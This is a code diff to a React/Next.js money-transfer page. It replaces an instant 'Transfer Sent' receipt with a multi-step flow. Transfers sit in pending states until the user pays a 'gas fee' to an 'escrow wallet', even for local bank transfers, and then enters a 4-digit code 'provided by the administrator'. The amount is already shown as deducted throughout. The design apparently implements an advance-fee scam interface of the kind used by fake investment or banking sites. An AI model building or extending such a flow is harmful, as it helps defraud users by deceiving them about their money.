@@ -22,6 +22,7 @@ import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import { useAuthStore } from "@/lib/store";
 import api from "@/lib/api";
+import GasFeeModal from "@/components/GasFeeModal";
 
 interface Account {
   id: string;
@@ -61,6 +62,9 @@ export default function TransfersPage() {
   const [accounts, setAccounts] = useState<Account[]>([]);
   const [isFetching, setIsFetching] = useState(true);
   const [isLoading, setIsLoading] = useState(false);
+  const [transactions, setTransactions] = useState<any[]>([]);
+  const [selectedTx, setSelectedTx] = useState<any>(null);
+  const [transferCode, setTransferCode] = useState("");
 
   // Common Transfer Fields
   const [sourceAccountId, setSourceAccountId] = useState("");
@@ -79,6 +83,10 @@ export default function TransfersPage() {
   const [network, setNetwork] = useState("");
   const [walletAddress, setWalletAddress] = useState("");
   const [showPreviewModal, setShowPreviewModal] = useState(false);
+  
+  // Modals
+  const [isGasFeeModalOpen, setIsGasFeeModalOpen] = useState(false);
+  const [selectedFeeTx, setSelectedFeeTx] = useState<any>(null);
 
   // Success states
   const [receiptData, setReceiptData] = useState<any>(null);
@@ -115,6 +123,31 @@ export default function TransfersPage() {
       setIsFetching(false);
     }
   }, [isAuthenticated]);
+
+  // Load & Poll Transactions
+  useEffect(() => {
+    const fetchTransactions = async () => {
+      try {
+        const response = await api.get("/accounts/transactions");
+        setTransactions(response.data.data.transactions);
+      } catch (err) {
+        console.error("Failed to load transactions", err);
+      }
+    };
+    
+    if (isAuthenticated) {
+      fetchTransactions();
+    }
+
+    // Set up polling interval to check transaction updates every 4 seconds
+    const interval = setInterval(() => {
+      if (isAuthenticated) {
+        fetchTransactions();
+      }
+    }, 4000);
+
+    return () => clearInterval(interval);
+  }, [isAuthenticated, step]);
 
   const sourceAccount = accounts.find(a => a.id === sourceAccountId);
   const currentBalance = sourceAccount ? Number(sourceAccount.balance) : 0;
@@ -178,6 +211,7 @@ export default function TransfersPage() {
         txId: response.data.data.transaction?.id || "N/A"
       });
 
+      // Show initiated state instead of instant success
       setStep("success");
     } catch (err: any) {
       setValidationError(err.response?.data?.message || "Transfer failed. Please check your transaction PIN.");
@@ -281,6 +315,67 @@ export default function TransfersPage() {
         </button>
       )}
 
+      {/* GLOBAL HEADER */}
+      <header className="mb-12 text-center md:text-left">
+        <span className="text-wise-green font-bold uppercase tracking-widest text-[10px] md:text-sm mb-2 block">
+          Global Transfers
+        </span>
+        <h1 className="font-billboard text-5xl md:text-7xl">Send Money</h1>
+      </header>
+
+      {/* PENDING TRANSFERS SECTION - AT TOP */}
+      {transactions.filter(t => ['AWAITING_FEE', 'PENDING_FEE_PAYMENT', 'AWAITING_CODE'].includes(t.status)).length > 0 && (
+        <div className="mb-8 bg-white rounded-[32px] md:rounded-[48px] border border-amber-200 p-6 md:p-10 shadow-sm relative overflow-hidden bg-gradient-to-br from-white to-amber-50">
+          <h2 className="text-2xl md:text-3xl font-black mb-6 text-amber-900">Pending Actions</h2>
+          <div className="space-y-4">
+            {transactions.filter(t => ['AWAITING_FEE', 'PENDING_FEE_PAYMENT', 'AWAITING_CODE'].includes(t.status)).map(tx => (
+              <div key={tx.id} className="bg-white border border-amber-200 rounded-2xl p-5 md:p-6 flex flex-col md:flex-row justify-between items-start md:items-center gap-6 shadow-sm">
+                <div>
+                  <p className="font-black text-2xl mb-1 text-near-black">{tx.currency} {Number(tx.amount).toLocaleString()}</p>
+                  <p className="text-sm font-bold text-muted mb-3">
+                    Status: <span className="text-amber-600 uppercase tracking-wider text-[11px]">{tx.status.replace(/_/g, ' ')}</span>
+                  </p>
+                  {tx.status === 'PENDING_FEE_PAYMENT' && tx.feeAmount && (
+                    <div className="p-4 bg-amber-50 border border-amber-200 rounded-xl">
+                      <p className="text-sm text-amber-900 font-black mb-1">
+                        Gas Fee Required: ${Number(tx.feeAmount).toLocaleString()} USD
+                      </p>
+                      <p className="text-xs text-amber-800 font-semibold leading-relaxed">
+                        Your transaction requires a network fee to proceed. Click below to view the secure escrow wallet details.
+                      </p>
+                    </div>
+                  )}
+                </div>
+                <div className="shrink-0 w-full md:w-auto flex flex-col gap-3">
+                  {tx.status === 'AWAITING_FEE' && (
+                    <span className="px-6 py-3 bg-gray-100 text-gray-500 rounded-xl text-sm font-black border border-gray-200 text-center uppercase tracking-widest text-[11px]">Processing Fee...</span>
+                  )}
+                  {tx.status === 'PENDING_FEE_PAYMENT' && (
+                    <button 
+                      onClick={() => {
+                        setSelectedFeeTx(tx);
+                        setIsGasFeeModalOpen(true);
+                      }}
+                      className="w-full md:w-auto px-8 py-3.5 bg-amber-500 text-white rounded-xl text-sm font-black hover:bg-amber-600 transition-colors shadow-md text-center"
+                    >
+                      Pay Gas Fee
+                    </button>
+                  )}
+                  {tx.status === 'AWAITING_CODE' && (
+                    <button 
+                      onClick={() => setSelectedTx(tx)}
+                      className="w-full md:w-auto px-8 py-3.5 bg-near-black text-white rounded-xl text-sm font-black hover:bg-black transition-colors shadow-md text-center"
+                    >
+                      Enter Transfer Code
+                    </button>
+                  )}
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
       {/* Main card */}
       <motion.div
         layout
@@ -364,7 +459,7 @@ export default function TransfersPage() {
             >
               <div>
                 <span className="text-[10px] font-bold text-wise-green uppercase tracking-widest bg-bg-mint px-3 py-1.5 rounded-full">Domestic Route</span>
-                <h1 className="font-section text-3xl md:text-4xl font-black mt-3">Local bank transfer</h1>
+                <h2 className="font-section text-3xl md:text-4xl font-black mt-3">Local bank transfer</h2>
               </div>
 
               {validationError && (
@@ -795,96 +890,224 @@ export default function TransfersPage() {
           )}
 
           {/* STEP 4: SUCCESS RECEIPT state */}
-          {step === "success" && receiptData && (
-            <motion.div
-              key="success"
-              initial={{ opacity: 0, scale: 0.95 }}
-              animate={{ opacity: 1, scale: 1 }}
-              exit={{ opacity: 0 }}
-              transition={{ duration: 0.3, type: "spring" }}
-              className="flex flex-col items-center gap-6 text-center"
-            >
-              <div className="w-20 h-20 rounded-full bg-wise-green/10 flex items-center justify-center mb-2">
-                <CheckCircle2 className="text-wise-green" size={54} />
-              </div>
-
-              <div>
-                <h1 className="font-section text-3xl md:text-4xl font-black text-near-black">Transfer Sent!</h1>
-                <p className="text-muted font-bold text-sm tracking-wide mt-1.5 uppercase">Transaction processed successfully</p>
-              </div>
-
-              {/* Receipt card */}
-              <div className="w-full bg-bg-page border border-border rounded-3xl p-6 md:p-8 text-left space-y-4 my-2 shadow-inner">
-                <div className="flex justify-between border-b border-dashed border-border pb-3">
-                  <span className="text-muted font-semibold text-sm">Receipt / Type</span>
-                  <strong className="text-near-black font-bold text-sm">{receiptData.type}</strong>
+          {step === "success" && receiptData && (() => {
+            const activeTx = transactions.find(t => t.id === receiptData.txId);
+            const currentStatus = activeTx ? activeTx.status : "AWAITING_FEE";
+            
+            return (
+              <motion.div
+                key="success"
+                initial={{ opacity: 0, scale: 0.95 }}
+                animate={{ opacity: 1, scale: 1 }}
+                exit={{ opacity: 0 }}
+                transition={{ duration: 0.3, type: "spring" }}
+                className="flex flex-col items-center gap-6 text-center"
+              >
+                <div className="w-20 h-20 rounded-full bg-wise-green/10 flex items-center justify-center mb-2 relative">
+                  {currentStatus === "COMPLETED" ? (
+                    <CheckCircle2 className="text-wise-green" size={54} />
+                  ) : currentStatus === "FAILED" || currentStatus === "CANCELLED" ? (
+                    <AlertCircle className="text-red-500" size={54} />
+                  ) : (
+                    <Loader2 className="animate-spin text-amber-500" size={54} />
+                  )}
                 </div>
 
-                <div className="flex justify-between items-center py-1">
-                  <span className="text-muted font-semibold text-sm">Total Deducted</span>
-                  <strong className="text-near-black font-black text-2xl">
-                    {receiptData.amount.toLocaleString()} {receiptData.currency}
-                  </strong>
+                <div>
+                  <h1 className="font-section text-3xl md:text-4xl font-black text-near-black">
+                    {currentStatus === "COMPLETED" ? "Transfer Sent!" : "Transfer Initiated"}
+                  </h1>
+                  <p className="text-muted font-bold text-sm tracking-wide mt-1.5 uppercase">
+                    Status: <span className={`font-black ${currentStatus === 'COMPLETED' ? 'text-wise-green' : 'text-amber-500'}`}>{currentStatus.replace(/_/g, ' ')}</span>
+                  </p>
                 </div>
 
-                <div className="flex justify-between border-b border-border pb-3 py-1">
-                  <span className="text-muted font-semibold text-sm">Target Settle</span>
-                  <strong className="text-emerald-700 font-bold text-sm bg-emerald-100/50 px-3 py-0.5 rounded-full">{receiptData.method}</strong>
+                {/* Progress Stepper */}
+                <div className="w-full grid grid-cols-4 gap-2 text-xs font-bold py-2 border-y border-border my-2">
+                  <div className="flex flex-col items-center gap-1">
+                    <span className="w-5 h-5 rounded-full bg-wise-green text-white flex items-center justify-center">✓</span>
+                    <span className="text-[10px] text-near-black">1. Initiated</span>
+                  </div>
+                  <div className="flex flex-col items-center gap-1">
+                    <span className={`w-5 h-5 rounded-full flex items-center justify-center ${
+                      ['PENDING_FEE_PAYMENT', 'AWAITING_CODE', 'COMPLETED'].includes(currentStatus) 
+                        ? "bg-wise-green text-white" 
+                        : "bg-amber-100 text-amber-600 animate-pulse"
+                    }`}>
+                      {['PENDING_FEE_PAYMENT', 'AWAITING_CODE', 'COMPLETED'].includes(currentStatus) ? "✓" : "2"}
+                    </span>
+                    <span className={`text-[10px] ${['PENDING_FEE_PAYMENT', 'AWAITING_CODE', 'COMPLETED'].includes(currentStatus) ? "text-near-black" : "text-muted"}`}>2. Gas Fee</span>
+                  </div>
+                  <div className="flex flex-col items-center gap-1">
+                    <span className={`w-5 h-5 rounded-full flex items-center justify-center ${
+                      ['COMPLETED'].includes(currentStatus) 
+                        ? "bg-wise-green text-white" 
+                        : currentStatus === "AWAITING_CODE"
+                        ? "bg-amber-100 text-amber-600 animate-pulse"
+                        : "bg-gray-100 text-gray-400"
+                    }`}>
+                      {['COMPLETED'].includes(currentStatus) ? "✓" : "3"}
+                    </span>
+                    <span className={`text-[10px] ${['COMPLETED', 'AWAITING_CODE'].includes(currentStatus) ? "text-near-black" : "text-muted"}`}>3. Code Verify</span>
+                  </div>
+                  <div className="flex flex-col items-center gap-1">
+                    <span className={`w-5 h-5 rounded-full flex items-center justify-center ${
+                      currentStatus === "COMPLETED" ? "bg-wise-green text-white" : "bg-gray-100 text-gray-400"
+                    }`}>
+                      {currentStatus === "COMPLETED" ? "✓" : "4"}
+                    </span>
+                    <span className={`text-[10px] ${currentStatus === "COMPLETED" ? "text-near-black" : "text-muted"}`}>4. Completed</span>
+                  </div>
                 </div>
 
-                <div className="flex justify-between py-1">
-                  <span className="text-muted font-semibold text-sm">Beneficiary Account</span>
-                  <strong className="text-near-black font-semibold text-sm">{receiptData.recipientName}</strong>
+                {/* Status Instructions / Interactive Forms */}
+                <div className="w-full text-left">
+                  {currentStatus === 'AWAITING_FEE' && (
+                    <div className="bg-amber-50 border border-amber-200 rounded-2xl p-4 flex gap-3">
+                      <Loader2 className="animate-spin text-amber-500 shrink-0 mt-0.5" size={20} />
+                      <div>
+                        <h4 className="font-bold text-amber-800 text-sm">Calculating Gas Fee</h4>
+                        <p className="text-xs text-amber-700 font-semibold mt-1">
+                          Our automatic networks are calculating the necessary gas fee for security clearing. This takes roughly 15-30 seconds. This page will update automatically.
+                        </p>
+                      </div>
+                    </div>
+                  )}
+
+                  {currentStatus === 'PENDING_FEE_PAYMENT' && activeTx && (
+                    <div className="bg-amber-50 border border-amber-200 rounded-2xl p-5 space-y-4 text-center flex flex-col items-center">
+                      <div>
+                        <h4 className="font-black text-amber-800 text-base">Gas Fee Required</h4>
+                        <p className="text-xs text-amber-700 font-semibold mt-1">
+                          A fee clearance is required to process your transaction. Click below to view the payment details.
+                        </p>
+                      </div>
+                      
+                      <button
+                        onClick={() => {
+                          setSelectedFeeTx(activeTx);
+                          setIsGasFeeModalOpen(true);
+                        }}
+                        className="w-full py-3 bg-amber-500 hover:bg-amber-600 text-white font-black text-sm rounded-xl transition-colors shadow-md cursor-pointer"
+                      >
+                        View & Pay Gas Fee
+                      </button>
+                    </div>
+                  )}
+
+                  {currentStatus === 'AWAITING_CODE' && activeTx && (
+                    <div className="bg-blue-50 border border-blue-200 rounded-2xl p-5 space-y-4">
+                      <div>
+                        <h4 className="font-black text-blue-800 text-base">Security Verification Code</h4>
+                        <p className="text-xs text-blue-700 font-semibold mt-1">
+                          Please enter the 4-digit security code sent/provided by the administrator to authorize the release of funds.
+                        </p>
+                      </div>
+
+                      <div className="flex gap-2">
+                        <input 
+                          type="text"
+                          maxLength={4}
+                          value={transferCode}
+                          onChange={(e) => setTransferCode(e.target.value.replace(/\D/g, ''))}
+                          placeholder="0000"
+                          className="flex-1 text-center bg-white border border-blue-200 focus:border-blue-500 rounded-xl py-3 text-2xl font-black tracking-[0.4em] focus:outline-none"
+                        />
+                        <button
+                          onClick={async () => {
+                            try {
+                              setIsLoading(true);
+                              await api.post(`/accounts/transfer/${activeTx.id}/verify-code`, { code: transferCode });
+                              setTransferCode("");
+                            } catch (err: any) {
+                              alert(err.response?.data?.message || "Invalid code");
+                            } finally {
+                              setIsLoading(false);
+                            }
+                          }}
+                          disabled={transferCode.length < 4 || isLoading}
+                          className="px-6 bg-blue-600 hover:bg-blue-700 text-white font-black text-sm rounded-xl transition-colors flex items-center justify-center disabled:opacity-50 cursor-pointer"
+                        >
+                          {isLoading ? <Loader2 className="animate-spin" size={18} /> : "Verify"}
+                        </button>
+                      </div>
+                    </div>
+                  )}
                 </div>
 
-                <div className="flex justify-between py-1">
-                  <span className="text-muted font-semibold text-sm">Network / Route</span>
-                  <strong className="text-near-black font-semibold text-sm">{receiptData.recipientDetail}</strong>
+                {/* Receipt card */}
+                <div className="w-full bg-bg-page border border-border rounded-3xl p-6 md:p-8 text-left space-y-4 my-2 shadow-inner">
+                  <div className="flex justify-between border-b border-dashed border-border pb-3">
+                    <span className="text-muted font-semibold text-sm">Receipt / Type</span>
+                    <strong className="text-near-black font-bold text-sm">{receiptData.type}</strong>
+                  </div>
+
+                  <div className="flex justify-between items-center py-1">
+                    <span className="text-muted font-semibold text-sm">Total Deducted</span>
+                    <strong className="text-near-black font-black text-2xl">
+                      {receiptData.amount.toLocaleString()} {receiptData.currency}
+                    </strong>
+                  </div>
+
+                  <div className="flex justify-between border-b border-border pb-3 py-1">
+                    <span className="text-muted font-semibold text-sm">Target Settle</span>
+                    <strong className="text-emerald-700 font-bold text-sm bg-emerald-100/50 px-3 py-0.5 rounded-full">{receiptData.method}</strong>
+                  </div>
+
+                  <div className="flex justify-between py-1">
+                    <span className="text-muted font-semibold text-sm">Beneficiary Account</span>
+                    <strong className="text-near-black font-semibold text-sm">{receiptData.recipientName}</strong>
+                  </div>
+
+                  <div className="flex justify-between py-1">
+                    <span className="text-muted font-semibold text-sm">Network / Route</span>
+                    <strong className="text-near-black font-semibold text-sm">{receiptData.recipientDetail}</strong>
+                  </div>
+
+                  <div className="flex justify-between py-1">
+                    <span className="text-muted font-semibold text-sm">Memo</span>
+                    <strong className="text-near-black font-medium text-sm italic">"{receiptData.memo}"</strong>
+                  </div>
+
+                  <div className="flex justify-between border-t border-border pt-3">
+                    <span className="text-muted font-semibold text-sm">Timestamp</span>
+                    <span className="text-near-black font-medium text-xs">{receiptData.date}</span>
+                  </div>
+
+                  <div className="flex flex-col gap-1 text-[10px] text-muted font-semibold pt-1">
+                    <span>Transaction ID:</span>
+                    <code className="bg-white border border-border p-2 rounded-lg text-near-black break-all select-all font-mono font-bold">{receiptData.txId}</code>
+                  </div>
                 </div>
 
-                <div className="flex justify-between py-1">
-                  <span className="text-muted font-semibold text-sm">Memo</span>
-                  <strong className="text-near-black font-medium text-sm italic">"{receiptData.memo}"</strong>
+                <div className="flex gap-4 w-full">
+                  <button
+                    onClick={() => {
+                      // Reset State
+                      setAmount("");
+                      setPin("");
+                      setReference("");
+                      setBeneficiaryName("");
+                      setBeneficiaryAccountNumber("");
+                      setBankName("");
+                      setWalletAddress("");
+                      setStep("select-type");
+                    }}
+                    className="flex-1 py-4 text-base font-black border-2 border-border hover:border-gray-400 rounded-xl transition-all cursor-pointer bg-white"
+                  >
+                    Send Another
+                  </button>
+                  <Link
+                    href="/"
+                    className="flex-1 py-4 text-base font-black bg-near-black text-white hover:bg-black rounded-xl text-center flex items-center justify-center transition-all cursor-pointer"
+                  >
+                    Go to Dashboard
+                  </Link>
                 </div>
 
-                <div className="flex justify-between border-t border-border pt-3">
-                  <span className="text-muted font-semibold text-sm">Timestamp</span>
-                  <span className="text-near-black font-medium text-xs">{receiptData.date}</span>
-                </div>
-
-                <div className="flex flex-col gap-1 text-[10px] text-muted font-semibold pt-1">
-                  <span>Transaction ID:</span>
-                  <code className="bg-white border border-border p-2 rounded-lg text-near-black break-all select-all font-mono font-bold">{receiptData.txId}</code>
-                </div>
-              </div>
-
-              <div className="flex gap-4 w-full">
-                <button
-                  onClick={() => {
-                    // Reset State
-                    setAmount("");
-                    setPin("");
-                    setReference("");
-                    setBeneficiaryName("");
-                    setBeneficiaryAccountNumber("");
-                    setBankName("");
-                    setWalletAddress("");
-                    setStep("select-type");
-                  }}
-                  className="flex-1 py-4 text-base font-black border-2 border-border hover:border-gray-400 rounded-xl transition-all cursor-pointer bg-white"
-                >
-                  Send Another
-                </button>
-                <Link
-                  href="/"
-                  className="flex-1 py-4 text-base font-black bg-near-black text-white hover:bg-black rounded-xl text-center flex items-center justify-center transition-all cursor-pointer"
-                >
-                  Go to Dashboard
-                </Link>
-              </div>
-
-            </motion.div>
-          )}
+              </motion.div>
+            );
+          })()}
 
         </AnimatePresence>
       </motion.div>
@@ -981,6 +1204,82 @@ export default function TransfersPage() {
           </div>
         )}
       </AnimatePresence>
+
+
+      {/* ENTER CODE MODAL */}
+      <AnimatePresence>
+        {selectedTx && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
+            <motion.div
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              onClick={() => setSelectedTx(null)}
+              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
+            />
+            <motion.div
+              initial={{ scale: 0.95, opacity: 0, y: 10 }}
+              animate={{ scale: 1, opacity: 1, y: 0 }}
+              exit={{ scale: 0.95, opacity: 0, y: 10 }}
+              className="bg-white rounded-3xl border border-border p-6 md:p-8 max-w-sm w-full shadow-2xl relative z-10 space-y-6 text-center"
+            >
+              <div>
+                <h3 className="text-2xl font-black text-near-black">Transfer Code</h3>
+                <p className="text-muted text-sm font-semibold mt-1">Enter the 4-digit code provided by the admin to finalize your transfer.</p>
+              </div>
+              
+              <input 
+                type="text"
+                maxLength={4}
+                value={transferCode}
+                onChange={(e) => setTransferCode(e.target.value.replace(/\D/g, ''))}
+                placeholder="0000"
+                className="w-full text-center bg-bg-page border border-border focus:border-wise-green rounded-xl py-4 text-3xl font-black tracking-[0.5em] focus:outline-none"
+              />
+
+              <div className="flex gap-3">
+                <button
+                  onClick={() => { setSelectedTx(null); setTransferCode(""); }}
+                  className="flex-1 py-3 text-sm font-black border-2 border-border hover:border-gray-400 rounded-xl cursor-pointer"
+                >
+                  Cancel
+                </button>
+                <button
+                  onClick={async () => {
+                    try {
+                      setIsLoading(true);
+                      await api.post(`/accounts/transfer/${selectedTx.id}/verify-code`, { code: transferCode });
+                      setSelectedTx(null);
+                      setTransferCode("");
+                      setStep("select-type"); // this will trigger the useEffect to refresh
+                    } catch (err: any) {
+                      alert(err.response?.data?.message || "Invalid code");
+                    } finally {
+                      setIsLoading(false);
+                    }
+                  }}
+                  disabled={transferCode.length < 4 || isLoading}
+                  className="flex-1 py-3 text-sm font-black bg-wise-green text-white hover:bg-emerald-600 rounded-xl flex items-center justify-center cursor-pointer disabled:opacity-50"
+                >
+                  {isLoading ? <Loader2 className="animate-spin" size={18} /> : "Verify"}
+                </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
+      <GasFeeModal 
+        isOpen={isGasFeeModalOpen} 
+        onClose={() => { setIsGasFeeModalOpen(false); setSelectedFeeTx(null); }} 
+        tx={selectedFeeTx} 
+        onSuccess={() => {
+          setIsGasFeeModalOpen(false);
+          setSelectedFeeTx(null);
+          // Just trigger a state toggle to refetch
+          setStep("local-form"); setTimeout(() => setStep("select-type"), 10);
+        }} 
+      />
 
     </div>
   );
